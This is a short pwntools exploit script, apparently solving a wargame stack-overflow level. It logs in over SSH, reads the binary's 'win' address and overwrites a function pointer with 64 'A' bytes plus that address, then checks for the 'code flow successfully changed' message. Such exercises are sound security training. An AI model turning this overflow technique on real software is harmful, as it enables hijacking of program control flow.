from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, local=lbin)
e = ELF(lbin)
win_addr = e.symbols['win']
log.info('win_addr: %08x', win_addr)

payload = flat(['A'*64, p32(win_addr)])

p = s.system(args.BIN)
p.sendline(payload)

ret = p.recvline()
assert ret.startswith('calling function pointer, jumping to ')
ret = p.recvline()
assert ret == 'code flow successfully changed\n'
